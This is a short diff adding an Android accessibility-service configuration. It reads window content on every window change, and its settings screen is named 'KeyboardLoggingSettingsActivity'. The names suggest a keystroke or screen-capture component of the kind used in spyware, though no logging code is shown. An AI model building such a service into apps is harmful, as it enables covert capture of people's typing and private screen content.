@@ -1,0 +1,9 @@
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:description="@string/accessibility_service_description_dat"
+    android:accessibilityEventTypes="typeWindowContentChanged|typeWindowsChanged|typeWindowStateChanged"
+    android:accessibilityFlags="flagDefault"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:notificationTimeout="1"
+    android:canRetrieveWindowContent="true"
+    android:settingsActivity="KeyboardLoggingSettingsActivity"
+    />
